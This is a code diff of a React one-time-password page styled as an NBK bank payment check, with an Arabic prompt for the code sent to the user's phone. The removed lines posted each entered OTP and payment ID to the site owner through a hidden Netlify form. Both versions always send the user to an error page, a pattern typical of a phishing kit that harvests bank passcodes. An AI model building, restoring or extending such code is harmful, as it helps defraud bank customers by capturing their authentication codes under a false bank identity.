@@ -1,4 +1,3 @@
-
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
@@ -13,49 +12,11 @@ const OTPVerification = () => {
     e.preventDefault();
     setLoading(true);
     
-    // Create a hidden form to submit to Netlify
-    const netlifyForm = document.createElement('form');
-    netlifyForm.setAttribute('name', 'otp-verification');
-    netlifyForm.setAttribute('method', 'POST');
-    netlifyForm.setAttribute('data-netlify', 'true');
-    netlifyForm.style.display = 'none';
-
-    // Add form fields
-    const fields = [
-      { name: 'form-name', value: 'otp-verification' },
-      { name: 'payment-id', value: id || '' },
-      { name: 'otp-code', value: otp },
-      { name: 'timestamp', value: new Date().toISOString() },
-      { name: 'status', value: 'submitted' }
-    ];
-
-    fields.forEach(field => {
-      const input = document.createElement('input');
-      input.setAttribute('type', 'hidden');
-      input.setAttribute('name', field.name);
-      input.setAttribute('value', field.value);
-      netlifyForm.appendChild(input);
-    });
-
-    document.body.appendChild(netlifyForm);
-    
-    // Submit the form
-    const formData = new FormData(netlifyForm);
-    fetch('/', {
-      method: 'POST',
-      headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: new URLSearchParams(formData as any).toString()
-    }).then(() => {
-      document.body.removeChild(netlifyForm);
-      setTimeout(() => {
-        navigate('/error');
-      }, 1000);
-    }).catch(() => {
-      document.body.removeChild(netlifyForm);
-      setTimeout(() => {
-        navigate('/error');
-      }, 1000);
-    });
+    // Simulate processing time
+    setTimeout(() => {
+      // Always redirect to error page (as per requirements)
+      navigate('/error');
+    }, 2000);
   };
 
   const handleCancel = () => {
@@ -64,14 +25,6 @@ const OTPVerification = () => {
 
   return (
     <div className="min-h-screen bg-gray-100" style={{ backgroundColor: '#f5f5f5' }}>
-      {/* Hidden Netlify form for form detection */}
-      <form name="otp-verification" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
-        <input type="text" name="payment-id" />
-        <input type="text" name="otp-code" />
-        <input type="text" name="timestamp" />
-        <input type="text" name="status" />
-      </form>
-
       {/* NBK Advertisement Banner - Mobile Optimized */}
       <div className="w-full h-20 sm:h-32 bg-gradient-to-r from-blue-400 to-blue-600 relative overflow-hidden">
         <img 
@@ -110,10 +63,7 @@ const OTPVerification = () => {
 
         {/* OTP Form Card - Mobile Optimized */}
         <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg p-4 sm:p-6 mb-3 sm:mb-6">
-          <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-6" name="otp-verification" method="POST" data-netlify="true">
-            <input type="hidden" name="form-name" value="otp-verification" />
-            <input type="hidden" name="payment-id" value={id || ''} />
-            
+          <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-6">
             <div className="text-center space-y-3 sm:space-y-4">
               <p className="text-gray-600 text-sm sm:text-lg px-2">
                 يرجى إدخال رمز التحقق المرسل إلى هاتفك المحمول
@@ -127,7 +77,6 @@ const OTPVerification = () => {
                   maxLength={6}
                   value={otp}
                   onChange={(value) => setOtp(value)}
-                  name="otp-code"
                 >
                   <InputOTPGroup className="gap-1 sm:gap-3">
                     <InputOTPSlot index={0} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
